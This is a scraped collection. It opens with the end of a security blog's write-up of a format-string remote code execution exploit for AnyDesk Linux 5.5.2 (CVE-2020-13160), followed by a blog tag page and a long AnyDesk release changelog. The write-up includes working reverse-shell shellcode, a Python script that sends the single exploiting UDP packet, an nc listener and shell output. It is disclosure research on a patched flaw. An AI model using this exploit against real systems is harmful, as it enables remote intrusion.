shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x59\x88\xc6"
shellcode += b"\x9c\x5f\xfe\x71\x38\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x33\xa1\x9e\x05\x35"
shellcode += b"\xfc\x2e\x52\x58\xd6\xc9\x99\x17\x69\x39\x81"
shellcode += b"\x5b\x88\xd7\xc0\x20\xfe\x71\x39\x08\xc0\x4f"
shellcode += b"\x7a\x35\xee\x2b\x52\x73\xd0\xc9\x99\x35\xfd"
shellcode += b"\x2f\x70\xa6\x46\xac\xbd\x07\xf1\x74\x4d\xaf"
shellcode += b"\xe2\xfd\xc4\xc6\xb6\xca\x17\x3b\xe1\xa8\xb3"
shellcode += b"\x2c\x96\x71\x6b\x11\x01\x21\xce\x08\xb6\xf8"
shellcode += b"\xde\x56\x8d\xc6\x9c\x5f\xfe\x71\x38"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')

```

Before running the exploit we start a `nc` listener on port 4444:

```

user@w00d:~$ nc -lvp 4444
Listening on [0.0.0.0] (family 0, port 4444)

```

Now we run the exploit script:

```

user@w00d:~$ ./final_exploit.py
sending payload ...
reverse shell should connect within 5 seconds

```

After a few seconds the front-end updates its online states, which triggers the exploit. The shellcode is executed and we receive a reverse shell:

```

...
Connection from localhost 52000 received!
id
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)

```
# Conclusion

By sending a single UDP packet to the target machine we are able to successfully exploit the discovered format string vulnerability to gain Remote Code Execution. In order to achieve this we triggered the vulnerability twice: once to write the address of the `GOT` entry of the `time` function to the stack and a second time to write the heap address of our shellcode to the `GOT` entry using a `dynamic field width`.

Please keep in mind that this is a proof of concept exploit targeting AnyDesk Linux version `5.5.2`. The exploit was developed for `Ubuntu 18.04.4 LTS` at the time of writing. In order to successfully run the exploit against other targets it probably needs to be adjusted.

At last I would like to thank AnyDesk for the immediate and professional reaction. A patch to fix the vulnerability was released only three days after my notification. Also the patch enabled `FULL RELRO` according to my suggestion. This remaps the `GOT` as read-only preventing an attacker from overwriting an entry within the `GOT`.

It is great to see when security is taken seriously.

Thanks for reading the article 🙂

**Timeline**
18/02/20 – Vendor Notification
19/02/20 – Vendor Acknowledgement
21/02/20 – Vendor Patch
09/06/20 – Public Disclosure

 Post Views: 50,562

  Categories[article](https://devel0pment.de/?cat=29)  Tags[CVE-2020-13160](https://devel0pment.de/?tag=cve-2020-13160), [exploitation](https://devel0pment.de/?tag=exploitation), [formatstring](https://devel0pment.de/?tag=formatstring), [fuzzing](https://devel0pment.de/?tag=fuzzing), [rce](https://devel0pment.de/?tag=rce)

## 9 Replies to “AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)”

1. ![](https://secure.gravatar.com/avatar/e82a050707aeed85933f04f71f9971fd?s=100&d=mm&r=g)
   [24. November 2020 at 4:31 pm](https://devel0pment.de/?p=1881#comment-2625)

   Do you by any chance know where I can find a document that details AnyDesk file format

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g)
      [24. November 2020 at 4:56 pm](https://devel0pment.de/?p=1881#comment-2626)

      No, sorry. I am not aware of any documentation. Probably there isn’t any publicly available.
3. ![](https://secure.gravatar.com/avatar/f2dbf914b04cd46b9b19fe0f11837221?s=100&d=mm&r=g)
   [11. December 2020 at 5:23 pm](https://devel0pment.de/?p=1881#comment-2645)

   the most difficult part is search 2 stack that reliable for format string argument …

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g)
      [12. December 2020 at 5:32 pm](https://devel0pment.de/?p=1881#comment-2647)

      Yes, in this case the stack varies when the format string vulnerability is triggered either by the username or by the hostname. You can increase the reliability by simply using values more down on the stack, as these values are more likely to stay the same between both calls.
5. ![](https://secure.gravatar.com/avatar/b576ed7219c952b200df2dbea3d1349f?s=100&d=mm&r=g)
   [25. March 2021 at 5:25 pm](https://devel0pment.de/?p=1881#comment-2935)

   What a nice piece of analysis. I’ve added this as a CTF target in one of my courses. The exploit seems rock solid on 18.04.4.

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g)
      [25. March 2021 at 5:41 pm](https://devel0pment.de/?p=1881#comment-2936)

      Thanks 🙂
7. ![](https://secure.gravatar.com/avatar/b7bd7975a28f65030a10b547eff24eca?s=100&d=mm&r=g)
   [26. March 2022 at 8:37 pm](https://devel0pment.de/?p=1881#comment-3704)

   it’s also stable on 18.04.6
9. ![](https://secure.gravatar.com/avatar/47ceb849cbd1957491ae35c4074e5311?s=100&d=mm&r=g) **[m3dsec](https://m3dsec.github.io/)** says:
   [6. April 2023 at 2:23 pm](https://devel0pment.de/?p=1881#comment-4173)

   Good job, reading this in 2023, and it rocks.

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g) **scryh** says:
      [6. April 2023 at 2:33 pm](https://devel0pment.de/?p=1881#comment-4174)

      Thank you!

Comments are closed.

## Post navigation

[Previous PostPrevious   Hack The Box – Rope](https://devel0pment.de/?p=1593)[Next PostNext ALLES! CTF 2020 – Actual ASLR 1/2](https://devel0pment.de/?p=2027)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from devel0pment.de_f56e1a4b_20250119_142559.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

# Tag: formatstring

Posted on [12. April 202113. April 2021](https://devel0pment.de/?p=2217)
## [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_title.png)

The [mpv](https://mpv.io/) media player provides a custom protocol handler (mf://) in order to merge multiple images to a video. An undocumented feature within this protocol handler allows the usage of a format specifier in the provided URL, which is evaluated using sprintf. This results in both, a format string vulnerability as well as a heap overflow ([CVE-2021-30145](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30145)).

After disclosing the vulnerability to the mpv team on the 3rd April 2021 I got an immediate response. The mpv team took the issue very seriously and immediately started to work on a patch with me. This was the first time I disclosed a vulnerability to an open source project and I was really impressed about the professional reaction and the passionate commitment. The patch was released only two days after my report on the 5th April 2021 ([commit](https://github.com/mpv-player/mpv/commit/d0c530919d8cd4d7a774e38ab064e0fabdae34e6)). Thanks a lot to avih, sfan5 and jeeb.

The impact of the format string vulnerability is limited on Linux, because the binary is compiled with FORTIFY\_SOURCE by default. Though the heap overflow can be used to gain arbitrary code execution by overflowing into an adjacent heap chunk and setting a function pointer to an attacker controlled value. Nevertheless I estimate the probability of exploitation in real life as quite low, because a victim has to be tricked into opening a malicious playlist (e.g. via a URL like http://10.0.0.1/evil.m3u) and the attacker has to have detailed information about the victim’s system to fine-tune the exploit.

Within this article I describe the vulnerability itself as well as the development of a proof of concept exploit for Ubuntu 20.04.2 LTS with ASLR disabled. At the end of the article I outline a few thoughts on how ASLR can be bypassed and what changes if we develop an exploit for Windows. The article is divided into the following sections:

– [Introduction](https://devel0pment.de/?p=2217#intro)

– [Format String Vulnerability](https://devel0pment.de/?p=2217#format)

– [Heap Overflow](https://devel0pment.de/?p=2217#hoverflow)

– [Exploitation](https://devel0pment.de/?p=2217#expl)

– [Further Thoughts](https://devel0pment.de/?p=2217#ft)

– [Conclusion](https://devel0pment.de/?p=2217#con)

[Continue reading “mpv media player – mf custom protocol vulnerability (CVE-2021-30145)”](https://devel0pment.de/?p=2217#more-2217)

Posted on [9. June 202015. June 2020](https://devel0pment.de/?p=1881)
## [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881)

![](https://devel0pment.de/wp-content/uploads/2020/06/cve.png)

One of my goals for this year is to spend a little bit more of my spare time on real world applications. Doing so I took a look at the remote desktop application [AnyDesk](https://anydesk.com/), which seems to quickly raise in popularity not only because of COVID-19. AnyDesk is available for a variety of operating systems including Windows, Linux, Android and iOS. By reversing and fuzzing the Linux version 5.5.2 of the application I was able to find a format string vulnerability, which can be used to gain Remote Code Execution (RCE) by sending a single UDP packet to the target machine. AnyDesk took the issue very seriously. They released a patch only three days after my notification (5.5.3) and paid me a bounty of 5.000 EUR. The vulnerability is tracked as [CVE-2020-13160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13160). Within this article I want to share all steps, which were involved in finding the vulnerability, understanding the bug and developing the RCE exploit. The article is divided into the following sections:

→ [Fuzzing](https://devel0pment.de/?p=1881#fuzzing)

→ [Bug](https://devel0pment.de/?p=1881#bug)

→ [Exploit](https://devel0pment.de/?p=1881#exploit)

    – [Strategy](https://devel0pment.de/?p=1881#strategy)

    – [The v in vsnprintf](https://devel0pment.de/?p=1881#vsnprintf)

    – [Gaining arbitrary write](https://devel0pment.de/?p=1881#write)

    – [Controlling the instruction pointer](https://devel0pment.de/?p=1881#ip)

    – [Hitting our shellcode: dynamic field width](https://devel0pment.de/?p=1881#shellcode)

    – [Final exploit](https://devel0pment.de/?p=1881#final)

→ [Conclusion](https://devel0pment.de/?p=1881#conclusion)

[Continue reading “AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)”](https://devel0pment.de/?p=1881#more-1881)

Posted on [23. May 202024. May 2020](https://devel0pment.de/?p=1593)
## [Hack The Box – Rope](https://devel0pment.de/?p=1593)

![](https://devel0pment.de/wp-content/uploads/2019/01/htb.png)

This article contains my writeup on the machine `Rope` from [Hack The Box](https://www.hackthebox.eu/). I really enjoyed the box, since it provides a total of three custom binaries, which are supposed to be exploited 🙂

![](https://devel0pment.de/wp-content/uploads/2019/10/htb_rope.png)

The article is divided into the following parts:

→ [User](https://devel0pment.de/?p=1593#user)
    – [Initial Recon](https://devel0pment.de/?p=1593#recon)
    – [httpserver](https://devel0pment.de/?p=1593#httpserver)
    – [Leak Memory Address](https://devel0pment.de/?p=1593#leak)
    – [Exploit Format String Vulnerability](https://devel0pment.de/?p=1593#fmt)
    – [Escalating from john to r4j (readlogs)](https://devel0pment.de/?p=1593#user_escalate)

→ [Root](https://devel0pment.de/?p=1593#root)
    – [Local Recon](https://devel0pment.de/?p=1593#recon2)
    – [contact](https://devel0pment.de/?p=1593#contact)
    – [Bruteforce](https://devel0pment.de/?p=1593#bruteforce)
    – [Libc Leak](https://devel0pment.de/?p=1593#libcleak)
    – [Final Exploit](https://devel0pment.de/?p=1593#finalexploit)

[Continue reading “Hack The Box – Rope”](https://devel0pment.de/?p=1593#more-1593)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from download.anydesk.com_d9fdcc08_20250119_125904.html ===
15.01.2025 - 9.0.2 (Windows)
----------------------------
New Features
- AnyDesk now detects the text caret location to position IME Input Text Fields more accurately
Fixed Bugs
- Fixed bug that could cause unnecessary entries in the Windows Event Log
- Fixed a rare crash on incoming connection
- Fixed multiple UI inconsistencies that allowed changing values without effect
- Fixed bug that caused connect-URLs to not always work as expected
- Fixed bug that prevented changes to Proxy Credentials to save in some Custom Client setups
- Fixed bug that caused Global Settings to show up in incorrect Color Theme
- Fixed bug that showed grey screen when closing a Session right after it started
- Fixed bug that caused AnyDesk to display that a new version is currently being downloaded when that is not the case
- Fixed bug that caused text to be cut off in Toolbar Edit
- Fixed bug that caused text to not be selectable or copyable in Toolbar Edit
Other Changes
- Improved localization
- Improved fidelity of UI in Light and Dark Themes
- Improved error messages when registering License via Command Line Interface
10.12.2024 - 6.4.0 (RPi)
----------------------------
Major changes:
- Migrated from GTK2 to GTK3
Fixed bugs:
- Fixed Accept Window can be controlled by Remote without permission granted
- Fixed audio is transmitted when disabled in Audio Settings
- Fixed opening Settings from command line
- Fixed memory leak during Incoming Session
- Fixed hanging keyboard modifier keys
- Fixed crash when recreating deleted Address Book entry
- Fixed creating new Address Book requires a restart to show up
- Fixed Screen Frame top border is missing on second monitor
- Fixed Address Book license restrictions
- Fixed Session Recording license restrictions
- Fixed File Transfer license restrictions
- Fixed Custom Client DEB URL handler does not work
- Fixed irrelevant functionalities enabled in Outgoing/Incoming only Custom clients
- Fixed starting Outgoing Session from command line on Debian 11
- Fixed setting Session Recordings directory from Recording Settings
- Fixed Screen Sharing profile is visible in Accept Window if the Session is marked as scam
- Fixed Session recording file can not be played until the opened Session Playback tab is closed
- Fixed start Session Recording button must be pressed twice to start the recording
- Fixed Follow Remote Cursor settings does not work
- Fixed Scam Warning does not appear if Accept Window is open
- Fixed Lock remote account on Session end does not work
- Fixed Access Control List is not visible in Custom Clients
- Fixed incorrect desktop shortcut name for Custom Clients
- Fixed wrong icons are shown in Session Toolbar during Outgoing Session
- Fixed deadlock when retrying Outgoing Connection from Session Closed dialog
- Fixed crash when scrolling through the Session Playback
- Fixed many more minor User Interface issues
Other changes:
- Improved user experience in Session Closed dialogs
05.12.2024 - 9.0.1 (Windows)
----------------------------
Fixed Bugs
- Fixed crash when updating AnyDesk
02.12.2024 - 9.0.0 (Windows)
----------------------------
New Features
- Introduced new feature AnyDesk Assist (UltimateCloud only):
- Technicians can now initiate sessions without the remote userâs AnyDesk-ID, simplifying access via the quick support client (if enabled). Includes tools for request creation, tracking, and management.
- Users can now request assistance from technicians directly from the client (if enabled).
- Introduced new feature Screen Recording
- Custom Clients now allow updating to a Custom Client of the same version but different Config
Fixed Bugs
- Fixed crash when renaming Address Book entries
- Fixed crash when removing entries from Address Book or Recent Sessions
- Fixed incorrect Banner message that could sometimes show when using Free Licenses
- Fixed visual inconsistencies in Dark Mode
- Fixed bug that allowed the option to show Address Book on startup in some unintended cases
- Fixed bug that caused sprodadic logouts of an AnyDesk Account
Other Changes
- Improved UI feedback when registering Licenses via URLs and added new silent option to suppress it
- Improved Localization of many languages
19.11.2024 - 7.2.0 (Android)
------------------
New Features:
- Improved UX with initial setup and reduced dialog popups on first start.
- File manager can now be used within an outgoing remote control session.
- Added drag and drop support in file manager on wide-screen devices.
- Picture in picture mode now gets automatically activated on Android 12 and higher when pressing the home button during an outgoing session.
- The AnyDesk trace file can now be viewed in-app.
- Added password confirmation field when setting up or changing a password.
- Now showing current permissions in system info.
- Improved unattended access.
- Improved translations.
Fixed Bugs:
- Fixed backend crash when user disconnects on frontend side.
- Fixed incoming session request notification not disappearing.
- Fixed an issue that caused the main menu to become unresponsive after completing the tutorial.
- Fixed AnyDesk not going to background on incoming session when it was in background before.
- Fixed crash on Android 14 when connecting via unattended access.
- Fixed crash on Android 14 when user rejects screen capture.
- Resolved an issue that caused the app to crash during incoming sessions when the device was rotated.
- Fixed crash when aspect ratio of screen is too extreme.
- Fixed crash when changing IP addresses in VPN settings.
- Fixed crash when copying the anydesk trace file and the file is too large.
- Fixed behavior that AnyDesk was logging out from user account in some scenarios.
- Fixed list of users when connecting to windows terminal server.
- Fixed item counter in file manager when selecting more than 10 items.
- Fixed password field in the AnyDesk app not working properly when remote controlled via AnyDesk.
- Fixed ad1 plugin not working on Amazon cube and FireTV devices.
- Fixed keyboard navigation in navigation drawer.
- Minor UI/UX fixes.
12.11.2024 - 6.4.0 (Linux)
------------------
Major changes:
- Migrated from GTK2 to GTK3
Fixed bugs:
- Fixed Accept Window can be controlled by Remote without permission granted
- Fixed audio is transmitted when disabled in Audio Settings
- Fixed opening Settings from command line
- Fixed memory leak during Incoming Session
- Fixed hanging keyboard modifier keys
- Fixed crash when recreating deleted Address Book entry
- Fixed creating new Address Book requires a restart to show up
- Fixed Screen Frame top border is missing on second monitor
- Fixed Address Book license restrictions
- Fixed Session Recording license restrictions
- Fixed File Transfer license restrictions
- Fixed Custom Client DEB URL handler does not work
- Fixed irrelevant functionalities enabled in Outgoing/Incoming only Custom clients
- Fixed starting Outgoing Session from command line on Debian 11
- Fixed setting Session Recordings directory from Recording Settings
- Fixed Screen Sharing profile is visible in Accept Window if the Session is marked as scam
- Fixed Session recording file can not be played until the opened Session Playback tab is closed
- Fixed start Session Recording button must be pressed twice to start the recording
- Fixed Follow Remote Cursor settings does not work
- Fixed Scam Warning does not appear if Accept Window is open
- Fixed Lock remote account on Session end does not work
- Fixed Access Control List is not visible in Custom Clients
- Fixed incorrect desktop shortcut name for Custom Clients
- Fixed wrong icons are shown in Session Toolbar during Outgoing Session
- Fixed deadlock when retrying Outgoing Connection from Session Closed dialog
- Fixed crash when scrolling through the Session Playback
- Fixed many more minor User Interface issues
Other changes:
- Improved user experience in Session Closed dialogs
31.10.2024 - 8.1.4 (macOS)
------------------
Fixed bugs:
- Fixed typing into remote device
Other changes:
AnyDesk code signing identity has been changed. Users might need to grant macOS privacy permissions to AnyDesk new. Please use Help->System Permissions Status->Reset all permissions in case any issues are encountered
24.10.2024 - 8.1.3 (macOS)
------------------
Fixed bugs:
- Fixed the Login Screen connectivity on macOS 15.0 Sequoia
- Improved handling of the expired license state
- Minor UI issues fixed
Other changes:
AnyDesk code signing identity has been changed. Users might need to grant macOS privacy permissions to AnyDesk new. Please use Help->System Permissions Status->Reset all permissions in case any issues are encountered
18.09.2024 - 8.1.0 (Windows)
----------------------------
New Features:
- Added URL based License Registration mechanism that allows registering a license via link
- The name of Address Book Entries is now shown in the tab header when connecting to them
- Update panel now shows both the installed and to-be-installed versions of AnyDesk
Fixed Bugs:
- Fixed bug that caused some messages to not show up after license registration
- Fixed bug that prevented some Custom Client settings to work
- Fixed some textual bugs in settings
- Fixed some DPI related visual bugs
- Fixed bug that prevented some users from enabling Two Factor Authentication
- Fixed bug that sometimes treated microphones as speakers
- Fixed bug that caused Displays to stay on even after an outgoing session already ended
- Fixed signing of Remote Printing Driver
- Fixed signing issues of MSI installer
- Fixed bug that sometimes caused the wrong Permission Profile to be selected after Elevation Requests
- Fixed bug that would silently fail Session Recordings when missing write permissions
- Fixed Drag&Drop behavior of Address Tiles
- Fixed behavior of Status Bar that shows Connection and License issues
- Fixed TCP Tunnel permission not working
- Fixed crash when clicking File Manager Button during while connecting
- Fixed missing close button in outgoing File Manager Session during while connecting
- Fixed Command Line Interface to open Settings to fit the restructured Settings pages
- Fixed missing "About AnyDesk" option in Incoming Only Custom Clients
- Fixed synchronization of some permission states so that options become available immediately when permission is granted
- Fixed handling of SAS permission
- Fixed crash when hitting Enter key in dialog to add Address to Address Book
- Fixed bug that allowed registering a license via CLI while logged in with an Account
- Fixed bug that showed Permission Profiles in Outgoing Only Custom Clients
- Fixed visual bug that caused the File Manager toolbar button to be highlighted when showing a screen
- Fixed bug that allowed connection without password after cancelling Remote Restart Attempt
- Fixed visual bug that caused email address to be cut off in Account Login Popup
- Fixed visual bug that caused About Panel to not update properly when adding On-Premise license
- Fixed bug that prevented Preset Password Banner from showing up when setting password via Dynamic Config in my.anydesk
- Fixed crash when cancelling UAC dialog (Elevation Request)
- Fixed bug that caused uninstaller to not remove everything
- Fixed rare crash in Permission Profile Settings
- Fixed crash in Command Line Interface when sending connection requests
- Fixed bug that caused Reset Password button to not show up correctly
- Fixed bug that caused visual indicator for active display to not work in full screen mode
- Fixed bug that prevented Alt-Tab to work in non-connection tabs during when there was an active session
- Fixed bug that allowed incoming connections in Forced Login Clients
- Fixed visual bug that affected + and - buttons in Wake-On-LAN settings
- Fixed subtle bug in Windows version detection logic
- Fixed bug that prevented removal of passwords from Permission Profiles
- Fixed bug that caused delayed update of Permission Profiles settings
- Fixed bug that prevented the Personal Address Book to open after login
- Fixed bug that caused clicking the user icon in File Manager to navigate to the wrong settings page
- Fixed bug that sometimes restricted permissions of legacy clients more than it should
- Fixed bug that did not restore Session Recording settings correctly when removing a license
- Fixed bug that prevented some buttons in the Session Limit Reached dialog from working
- Fixed crash when adding Permission Profiles via Command Line Interface
- Fixed crash when trying to open Chat Log from Recent Session list
- Fixed crash when trying to open Session Recordings from Recent Session list
- Fixed bug that caused + and - buttons for Access Control List to be invisible
- Fixed bug that would stop audio transmission when minimizing the window
- Fixed scaling of resize border on big resolution screens
- Fixed bugs that caused synchronization of some settings between multiple settings windows to not happen correctly
- Fixed bug that caused previous window size to not be remembered correctly in some cases
- Fixed many more minor User Interface issues
Other Changes:
- Improved localization
- Improved user experience when connecting to iOS clients
18.09.2024 - 8.1.2 (macOS)
--------------------------
Fixed bugs:
- Fixed mouse double-click when controling the remote macOS device
- Improved error handling with links to the Help Center
- AnyDesk Installer fixes
- Security issues addressed
- Minor UI issues fixed
Other Changes:
- Improved overall handling of expired licenses
Known Issues:
- AnyDesk 8.1.2 has only limited macOS 15.0 Sequoia support. Features like connecting to the Login Screen or Remote Restart might not work
18.09.2024 - 6.3.3 (Linux)
--------------------------
Other Changes
- Improved overall handling of expired licenses
28.08.2024 - 8.0.14 (Windows)
-----------------------------
New Features:
- Actions on the tray icon can now be disabled in custom clients
Other Changes:
- Improved handling of expired licenses
13.08.2024 - 8.0.13 (Windows)
-----------------------------
New Features:
- License registration via URL handler
Fixed Bugs:
- Crash on trying to establish a session in case of expired license
Other Changes:
- Improved overall handling of expired licenses
23.07.2024 - 8.0.12 (Windows)
-----------------------------
Fixed Bugs:
- Fixed crash when starting AnyDesk via Command Line Interface
16.07.2024 - 8.1.1 (macOS)
------------------
New Features:
- Preview files with QuickLook in the File Manager
- File Manager navigation with Keyboard
- Address Book hierarchical tags support
- Remote restart support for Macs with FileVault enabled
Fixed bugs:
- Sticky modifier keys issue addressed
- Improved Chat notifications
- Fixed mouse text selection issue when working with Pages and Numbers applications remotely
- Minor UI issues fixed
10.07.2024 - 8.0.11 (Windows)
----------------
Other Changes:
- Improved anti-fraud measures
05.06.2024 - 7.1.8 (Android)
----------------
Fixed Bugs:
- Fixed deadlock on start when showing the news tutorial on some devices.
23.05.2024 - 7.1.2 (Android)
----------------
New Features
\* Added link for account deletion.
\* Improved screen capture after orientation change.
Fixed Bugs
\* Fixed missing UI focus feedback on AndroidTV for some elements.
\* Added scrolling to privacy dialog.
Other Changes
\* New release format for AndroidTV.
21.05.2024 - 8.1.0 (macOS)
------------------
New Features:
- Virtual Keyboard
- Notifications for incoming Chat messages
- New option for auto-scrolling the remote desk view
- New option for controling online status visibility
- New options for changing the location for saved screen shots and chat logs
Fixed bugs:
- Improved UI for connection status panel
- Fixed app quit priority on macOS user logout
- Fixed keyboard input for Korean
- Minor UI glitches fixed
- Fixed issue when multiple sessions active to remote device with multiple monitors
25.04.2024 - 8.0.10 (Windows)
-------------------
Fixed Bugs:
- Fixed direct connections between clients in the same LAN
- Fixed crash when Outgoing Session is being closed
- Fixed Main Window visibility after closing Outgoing Session in Custom Clients with Preset Password
- Fixed visibility of Remove button in settings for Access Control (ACL) and Wake-on-LAN when using Light UI theme
- Fixed keyboard interaction with ACL list in Access Settings
- Fixed behavior of Block Remote Input permission
- Fixed restriction of Update parameters for unlicensed clients
- Fixed sending Network ID to the Server
Other Changes:
- Allow hiding the Retry button in Session Ended dialogues
- Allow to show Session title when using plain-with-toolbar mode
- Allow to hide the Client ID in incoming-only Custom Clients
- Disallow Privacy Mode for Incoming connections from unlicensed legacy clients.
- Disallow removing expired Licenses
- Improve usability of the User selection dialog when connecting to Windows Terminal Server
28.03.2024 - 8.0.9 (Windows)
------------------
Fixed bugs:
- Fixed bug regarding event logs for Incoming clients
- Fixed bug regarding removable license for OnPremises
- Fixed bug related to session bar that activates/deactivates Night mode when clicking on different displays in Display settings
- Fixed bug regarding session closing if backend user performs logoff
- Fixed crash related to changing monitor count
- Fixed bug related to transmitting authentication data for elevation
- Fixed bug related to desktop's alternative background
- Fixed bug when it is possible to register alias on portable
- Fixed crash when request elevation
- Fixed bug related to behaviour for command line option "âsettings:playback\_browser"
